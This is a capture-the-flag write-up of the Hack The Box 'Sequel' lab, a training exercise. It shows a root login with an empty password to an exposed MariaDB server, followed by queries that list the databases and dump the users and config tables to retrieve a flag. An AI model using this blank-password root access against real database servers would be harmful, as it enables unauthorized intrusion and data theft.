# Sequel

![Platform: Hack The Box](https://img.shields.io/badge/Platform-Hack%20The%20Box-9FEF00?style=for-the-badge) ![Type: Starting Point](https://img.shields.io/badge/Type-Starting%20Point-3B5BDB?style=for-the-badge) ![Difficulty: Very Easy](https://img.shields.io/badge/Difficulty-Very Easy-2F9E44?style=for-the-badge) ![OS: Linux](https://img.shields.io/badge/OS-Linux-495057?style=for-the-badge) ![Status: Solved](https://img.shields.io/badge/Status-Solved-2F9E44?style=for-the-badge)

Lab link: [Sequel](https://app.hackthebox.com/starting-point)

## Completion proof

![Completion proof](assets/05-completion-proof.png)

## Reconnaissance

![MySQL service scan](assets/01-mysql-scan.png)

The scan identified TCP/3306 as MySQL-compatible. The `mysql-info` NSE script revealed that the service was MariaDB 10.3.27, a community-developed MySQL-compatible server.

## Connecting to MariaDB

![MariaDB connection](assets/02-mysql-connection.png)

I connected to the target with the MariaDB/MySQL client as `root` and left the password empty:

```bash
mysql -h <target-ip> -P 3306 -u root -p
```

The warning about certificate verification was informational; the MariaDB prompt confirmed a successful connection.

## Discovering the database

I first listed the databases, selected the host-specific database, and listed its tables:

```sql
SHOW DATABASES;
USE htb;
SHOW TABLES;
```

The database contained `users` and `config` tables. I inspected both tables with:

```sql
SELECT * FROM users;
SELECT * FROM config;
```

![Tables and rows](assets/04-tables-and-data.png)

## Selecting the flag row

The `config` table contained a row whose `id` was 5. I selected only that row and its value:

```sql
SELECT * FROM config WHERE id = 5;
SELECT value FROM config WHERE id = 5;
```

![Flag query](assets/06-flag-query.png)

I submitted the displayed value to complete the lab. The flag value is intentionally not transcribed here.

## Help discovery

When I needed the syntax for selecting a database, I used MariaDB's built-in help:

```sql
HELP USE;
```

This displayed the `USE db_name` syntax. `HELP CONTENTS;` can be used to browse server-side SQL help topics, while `HELP;` lists client commands.

